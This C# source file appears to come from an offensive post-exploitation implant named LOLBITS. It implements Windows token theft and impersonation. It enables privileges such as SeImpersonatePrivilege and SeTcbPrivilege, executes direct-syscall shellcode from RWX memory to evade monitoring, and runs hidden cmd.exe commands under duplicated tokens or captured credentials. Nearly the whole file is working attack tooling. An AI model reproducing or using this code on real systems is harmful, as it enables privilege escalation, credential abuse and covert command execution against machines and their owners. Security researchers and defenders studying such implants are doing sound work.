using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using LOLBITS.TokenManagement;

namespace LOLBITS
{
    public unsafe class Utils
    {
        public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;
        public const int SECURITY_MANDATORY_UNTRUSTED_RID = (0x00000000);
        public const int SECURITY_MANDATORY_LOW_RID = (0x00001000);
        public const int SECURITY_MANDATORY_MEDIUM_RID = (0x00002000);
        public const int SECURITY_MANDATORY_HIGH_RID = (0x00003000);
        public const int SECURITY_MANDATORY_SYSTEM_RID = (0x00004000);
        public const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = (0x00005000);

        private const Int32 AnySizeArray = 1;

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct Luid
        {
            public readonly uint LowPart;
            public readonly int HighPart;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out Luid lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);

        [StructLayout(LayoutKind.Sequential)]
        public struct LuidAndAttributes
        {
            public Luid Luid;
            public UInt32 Attributes;
        }
        
        public struct TokenPrivileges
        {
            public UInt32 PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = AnySizeArray)]
            public LuidAndAttributes[] Privileges;
        }


        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        };


        [Flags()]
        public enum TokenAccessFlags : int
        {
            StandardRightsRequired = 0x000F0000,
            StandardRightsRead = 0x00020000,
            TokenAssignPrimary = 0x0001,
            TokenDuplicate = 0x0002,
            TokenImpersonate = 0x0004,
            TokenQuery = 0x0008,
            TokenQuerySource = 0x0010,
            TokenAdjustPrivileges = 0x0020,
            TokenAdjustGroups = 0x0040,
            TokenAdjustDefault = 0x0080,
            TokenAdjustSessionId = 0x0100,
            TokenRead = (StandardRightsRead | TokenQuery),
            TokenAllAccess = (StandardRightsRequired | TokenAssignPrimary |
                TokenDuplicate | TokenImpersonate | TokenQuery | TokenQuerySource |
                TokenAdjustPrivileges | TokenAdjustGroups | TokenAdjustDefault |
                TokenAdjustSessionId)
        }


        public enum SecurityImpersonationLevel
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TokenType
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [Flags]
        public enum CreationFlags
        {
            CreateBreakawayFromJob = 0x01000000,
            CreateDefaultErrorMode = 0x04000000,
            CreateNewConsole = 0x00000010,
            CreateNewProcessGroup = 0x00000200,
            CreateNoWindow = 0x08000000,
            CreateProtectedProcess = 0x00040000,
            CreatePreserveCodeAuthLevel = 0x02000000,
            CreateSeparateWowVdm = 0x00001000,
            CreateSuspended = 0x00000004,
            CreateUnicodeEnvironment = 0x00000400,
            DebugOnlyThisProcess = 0x00000002,
            DebugProcess = 0x00000001,
            DetachedProcess = 0x00000008,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct StartupInfo
        {
            public Int32 cb;
            public readonly string lpReserved;
            public string lpDesktop;
            public readonly string lpTitle;
            public readonly Int32 dwX;
            public readonly Int32 dwY;
            public readonly Int32 dwXSize;
            public readonly Int32 dwYSize;
            public readonly Int32 dwXCountChars;
            public readonly Int32 dwYCountChars;
            public readonly Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public readonly Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        private enum TokenInformationClass
        {
            /// The buffer receives a <see cref="TokenUser"/> structure that contains the user account of the token.
            TokenUser = 1,
            /// The buffer receives a <see cref="TokenGroups"/> structure that contains the group accounts associated with the token.
            TokenGroups,
            /// The buffer receives a <see cref="TokenPrivileges"/> structure that contains the privileges of the token.
            TokenPrivileges,
            /// The buffer receives a <see cref="TokenOwner"/> structure that contains the default owner security identifier (SID) for newly created objects.
            TokenOwner,
            /// The buffer receives a <see cref="TokenPrimaryGroup"/> structure that contains the default primary group SID for newly created objects.
            TokenPrimaryGroup,
            /// The buffer receives a <see cref="TokenDefaultDacl"/> structure that contains the default DACL for newly created objects.
            TokenDefaultDacl,
            /// The buffer receives a <see cref="TokenSource"/> structure that contains the source of the token. TOKEN_QUERY_SOURCE access is needed to retrieve this information.
            TokenSource,
            /// The buffer receives a <see cref="TokenType"/> value that indicates whether the token is a primary or impersonation token.
            TokenType,
            /// The buffer receives a <see cref="TokenImpersonationLevel"/> value that indicates the impersonation level of the token. If the access token is not an impersonation token, the function fails.
            TokenImpersonationLevel,
            /// The buffer receives a <see cref="TokenStatistics"/> structure that contains various token statistics.
            TokenStatistics,
            /// The buffer receives a <see cref="TokenGroups"/> structure that contains the list of restricting SIDs in a restricted token.
            TokenRestrictedSids,
            /// The buffer receives a <see cref="TokenSessionId"/> as a DWORD value that indicates the Terminal Services session identifier that is associated with the token.
            TokenSessionId,
            /// The buffer receives a <see cref="TokenGroupsAndPrivileges"/> structure that contains the user SID, the group accounts, the restricted SIDs, and the authentication ID associated with the token.
            TokenGroupsAndPrivileges,
            /// Reserved.
            TokenSessionReference,
            /// The buffer receives a <see cref="TokenSandBoxInert"/> as a DWORD value that is nonzero if the token includes the SANDBOX_INERT flag.
            TokenSandBoxInert,
            /// Reserved.
            TokenAuditPolicy,
            /// The buffer receives a <see cref="TokenOrigin"/> value.
            TokenOrigin,
            /// The buffer receives a <see cref="TokenElevationType"/> value that specifies the elevation level of the token.
            TokenElevationType,
            /// The buffer receives a <see cref="TokenLinkedToken"/> structure that contains a handle to another token that is linked to this token.
            TokenLinkedToken,
            /// The buffer receives a <see cref="TokenElevation"/> structure that specifies whether the token is elevated.
            TokenElevation,
            /// The buffer receives a <see cref="TokenHasRestrictions"/> as a DWORD value that is nonzero if the token has ever been filtered.
            TokenHasRestrictions,
            /// The buffer receives a <see cref="TokenAccessInformation"/> structure that specifies security information contained in the token.
            TokenAccessInformation,
            /// The buffer receives a <see cref="TokenVirtualizationAllowed"/> as a DWORD value that is nonzero if virtualization is allowed for the token.
            TokenVirtualizationAllowed,
            /// The buffer receives a <see cref="TokenVirtualizationEnabled"/> as a DWORD value that is nonzero if virtualization is enabled for the token.
            TokenVirtualizationEnabled,
            /// The buffer receives a <see cref="TokenIntegrityLevel"/> structure that specifies the token's integrity level.
            TokenIntegrityLevel,
            /// The buffer receives a <see cref="TokenUiAccess"/> as a DWORD value that is nonzero if the token has the UIAccess flag set.
            TokenUiAccess,
            /// The buffer receives a <see cref="TokenMandatoryPolicy"/> structure that specifies the token's mandatory integrity policy.
            TokenMandatoryPolicy,
            /// The buffer receives the token's logon security identifier (SID).
            TokenLogonSid,
            /// The maximum value for this enumeration
            MaxTokenInfoClass
        }

        public enum SystemInformationClass
        {
            SystemBasicInformation = 0x0000,
            SystemProcessorInformation = 0x0001,
            SystemPerformanceInformation = 0x0002,
            SystemPathInformation = 0x0004,
            SystemProcessInformation = 0x0005,                   
            SystemExtendedProcessInformation = 0x0039,
            SystemFullProcessInformation = 0x0094,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public readonly int dwProcessId;
            public readonly int dwThreadId;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(IntPtr tokenHandle, [MarshalAs(UnmanagedType.Bool)]bool disableAllPrivileges, ref TokenPrivileges newState, Int32 zero, IntPtr null1, IntPtr null2);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr processHandle, TokenAccessFlags desiredAccess, out IntPtr tokenHandle);


        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            TokenAccessFlags dwDesiredAccess,
            IntPtr lpThreadAttributes,
            SecurityImpersonationLevel impersonationLevel,
            TokenType tokenType,
            out IntPtr phNewToken);

        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto,
            CallingConvention = CallingConvention.StdCall)]
        public static extern bool CloseHandle(IntPtr handle);

        [StructLayout(LayoutKind.Sequential)]
        public struct SecurityAttributes
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcessAsUserW(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            LogonFlags dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SecurityAttributes lpPipeAttributes, Int32 nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
             string userName,
             string domain,
             string password,
             LogonFlags logonFlags,
             string applicationName,
             string commandLine,
             CreationFlags creationFlags,
             UInt32 environment,
             string currentDirectory,
             ref StartupInfo startupInfo,
             out ProcessInformation processInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetTokenInformation(IntPtr tokenHandle, TokenInformationClass tokenInformationClass, IntPtr tokenInformation, uint tokenInformationLength, out uint returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr VirtualAlloc(IntPtr baseAddress, UIntPtr size, MemoryAllocationFlags allocationType, MemoryProtectionFlags protection);

        [Flags]
        internal enum MemoryAllocationFlags
        {
            Commit = 0x01000,
            Reserve = 0x02000
        }

        [Flags]
        internal enum MemoryProtectionFlags
        {
            ExecuteReadWrite = 0x040,
        }
        [DllImport("ntdll.dll")]
        public static extern int NtQuerySystemInformation(SystemInformationClass infoClass, IntPtr info, uint size, out uint length);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtOpenProcessToken(IntPtr processHandle, TokenAccessFlags desiredAccess, out IntPtr tokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, out IntPtr buffer, uint numberOfBytesToRead, out IntPtr numberOfBytesReaded);

        public static bool EnablePrivileges(IntPtr handle, List<string> privileges)
        {
            Luid myLuid;

            foreach (string privilege in privileges)
            {

                try
                {

                    if (LookupPrivilegeValue(null, privilege, out myLuid))
                    {
                        TokenPrivileges myTokenPrivileges;

                        myTokenPrivileges.PrivilegeCount = 1;
                        myTokenPrivileges.Privileges = new LuidAndAttributes[1];
                        myTokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                        myTokenPrivileges.Privileges[0].Luid = myLuid;

                        AdjustTokenPrivileges(handle, false, ref myTokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero);
                    }

                }
                catch { return false; }

            }
            return true;

        }

        public static void GetProcessHandle(int pid, out IntPtr handle, ProcessAccessFlags flags)
        {
            handle = OpenProcess(flags, false, pid);
        }

        public static void GetProcessToken(IntPtr handle, TokenAccessFlags access, out IntPtr currentToken, SysCallManager sysCall)
        {

            IntPtr baseAddr = IntPtr.Zero;
            byte[] shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
            var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellCode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
            IntPtr token = IntPtr.Zero;
            var arguments = new object[] { handle, access, token };
            var returnValue = sysCallDelegate.DynamicInvoke(arguments);

            currentToken = (IntPtr)arguments[2];
        }

        public static void DuplicateToken(IntPtr token, TokenAccessFlags tokenAccess, SecurityImpersonationLevel se, TokenType type, out IntPtr duplicated)
        {
            if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, se, type, out duplicated))
            {
                duplicated = IntPtr.Zero;
            }
        }

        public static void DetermineImpersonationMethod(IntPtr token, LogonFlags l, StartupInfo startupInfo, out ProcessInformation processInfo)

        {
            if (CreateProcessAsUserW(token, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                TokenManager.Method = 1;
            else
            {
                if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                    TokenManager.Method = 2;

            }
        }


        // Code from https://www.pinvoke.net/default.aspx/Constants/SECURITY_MANDATORY.html
        public static bool IsHighIntegrity(SysCallManager sysCall)
        {
            IntPtr pId = (Process.GetCurrentProcess().Handle);

            IntPtr hToken = IntPtr.Zero;

            IntPtr baseAddr = IntPtr.Zero;
            byte[] shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
            var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellCode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
            IntPtr token = IntPtr.Zero;
            var arguments = new object[] { pId, TokenAccessFlags.TokenQuery, token };
            var returnValue = sysCallDelegate.DynamicInvoke(arguments);

            if ((int)returnValue == 0)
            {
                try
                {
                    hToken = (IntPtr)arguments[2];
                    IntPtr pb = Marshal.AllocCoTaskMem(1000);
                    try
                    {
                        uint cb = 1000;
                        if (GetTokenInformation(hToken, TokenInformationClass.TokenIntegrityLevel, pb, cb, out cb))
                        {
                            IntPtr pSid = Marshal.ReadIntPtr(pb);

                            int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));

                            return dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID ? true : false;


                        }

                    }
                    finally
                    {
                        Marshal.FreeCoTaskMem(pb);
                    }
                }
                finally
                {
                    CloseHandle(hToken);
                }
            }

            return false;

        }

        public static void Start()
        {

            SysCallManager sysCall = new SysCallManager();


            try
            {
                IntPtr token = WindowsIdentity.GetCurrent().Token;
                List<string> privileges = new List<string>();

                privileges.Add("SeImpersonatePrivilege");
                privileges.Add("SeTcbPrivilege");
                privileges.Add("SeAssignPrimaryTokenPrivilege");
                privileges.Add("SeIncreaseQuotaPrivilege");

                IntPtr currentToken;

                IntPtr baseAddress = IntPtr.Zero;
                byte[] shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
                var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellCode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
                var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
                IntPtr t = IntPtr.Zero;
                var arguments = new object[] { Process.GetCurrentProcess().Handle, TokenAccessFlags.TokenAdjustPrivileges, t };
                var returnValue = sysCallDelegate.DynamicInvoke(arguments);

                currentToken = (IntPtr)arguments[2];
                EnablePrivileges(currentToken, privileges);

                CloseHandle(currentToken);

                TokenAccessFlags tokenAccess = TokenAccessFlags.TokenQuery | TokenAccessFlags.TokenAssignPrimary |
                TokenAccessFlags.TokenDuplicate | TokenAccessFlags.TokenAdjustDefault |
                TokenAccessFlags.TokenAdjustSessionId;

                IntPtr newToken = IntPtr.Zero;
                if (!DuplicateTokenEx(token, tokenAccess, IntPtr.Zero, SecurityImpersonationLevel.SecurityImpersonation, TokenType.TokenPrimary, out newToken))
                {
                    return;

                }

                StartupInfo startupInfo = new StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                ProcessInformation processInfo = new ProcessInformation();
                LogonFlags l = new LogonFlags();

                if (CreateProcessAsUserW(newToken, @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                {
                    TokenManager.Token = newToken;
                    TokenManager.Method = 1;

                }
                else
                {
                    if (CreateProcessWithTokenW(newToken, l, @"c:\windows\system32\cmd.exe /Q /C sc delete NewDefaultService2 && exit", null, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                    {
                        TokenManager.Token = newToken;
                        TokenManager.Method = 2;

                    }
                }

            }
            catch { }
        }

        public static string ExecuteCommand(string command)
        {
            string output = "";
            if (TokenManager.Token == IntPtr.Zero && TokenManager.Method == 0)
            {
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = @"C:\windows\system32\cmd.exe";
                startInfo.Arguments = "/C" + command + " && exit";
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.UseShellExecute = false;
                process.StartInfo = startInfo;
                process.Start();
                output = process.StandardOutput.ReadToEnd();
                if (output == "")
                    output = string.Concat("ERR:", process.StandardError.ReadToEnd());
                process.WaitForExit();
                process.Close();
            }
            else
            {

                IntPtr outRead = IntPtr.Zero;
                IntPtr outWrite = IntPtr.Zero;

                SecurityAttributes saAttr = new SecurityAttributes();
                saAttr.nLength = Marshal.SizeOf(typeof(SecurityAttributes));
                saAttr.bInheritHandle = true;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                CreatePipe(ref outRead, ref outWrite, ref saAttr, 0);

                StartupInfo startupInfo = new StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.hStdOutput = outWrite;
                startupInfo.hStdError = outWrite;
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000101;

                ProcessInformation processInfo = new ProcessInformation();
                LogonFlags l = new LogonFlags();

                if (TokenManager.Method == 1)

                    CreateProcessAsUserW(TokenManager.Token, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);

                else if (TokenManager.Method == 2)

                    CreateProcessWithTokenW(TokenManager.Token, l, @"c:\windows\system32\cmd.exe /Q /C" + @command, null, 0, IntPtr.Zero, null, ref startupInfo, out processInfo);

                else

                    CreateProcessWithLogonW(TokenManager.Credentials[0], TokenManager.Credentials[1], TokenManager.Credentials[2], l, null, @"c:\windows\system32\cmd.exe /Q /C" + command, 0, 0, null, ref startupInfo, out processInfo);


                byte[] buf = new byte[100];
                int dwRead = 0;
                Thread.Sleep(500);

                while (true)
                {
                    bool bSuccess = ReadFile(outRead, buf, 100, ref dwRead, IntPtr.Zero);
                    output = string.Concat(output, Encoding.Default.GetString(buf));

                    if (!bSuccess || dwRead < 100)
                        break;


                }

                CloseHandle(outRead);
                CloseHandle(outWrite);
            }

            return output;
        }

        internal static void RunAs(string domain, string user, string password)
        {
            StartupInfo startupInfo = new StartupInfo();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.lpDesktop = "";
            startupInfo.wShowWindow = 0;
            startupInfo.dwFlags |= 0x00000001;

            ProcessInformation processInfo = new ProcessInformation();
            LogonFlags logonFlags = new LogonFlags();

            if (CreateProcessWithLogonW(user, domain, password, logonFlags, null, @"c:\windows\system32\cmd.exe /Q /C hostname", 0, 0, null, ref startupInfo, out processInfo))
            {
                TokenManager.Method = 3;
                TokenManager.Credentials[0] = user;
                TokenManager.Credentials[1] = domain;
                TokenManager.Credentials[2] = password;
            }

        }
    }
}
